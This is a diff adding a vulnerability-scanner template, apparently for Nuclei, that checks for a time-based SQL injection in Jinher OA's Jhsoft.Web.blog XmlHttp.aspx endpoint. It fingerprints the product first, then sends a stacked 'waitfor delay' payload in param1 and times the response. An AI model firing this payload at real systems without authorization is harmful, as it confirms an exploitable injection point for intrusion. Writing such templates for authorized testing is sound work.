@@ -1,0 +1,46 @@
+id: poc-yaml-jinher-jhsoft-web-blog-sqli
+info:
+  name: 金和OA Jhsoft.Web.blog SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+
+  - raw:
+      - |
+        GET /c6/Jhsoft.Web.blog/XmlHttp.aspx/?Operation=delPhoto&param1=1;waitfor+delay%270:0:{{t1}}%27--&param2=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "ASP.NET_SessionId="
+      - type: word
+        part: body
+        words:
+          - "ok"
+      - type: dsl
+        dsl:
+          - "duration >= t1"
+          - "duration <= t2"
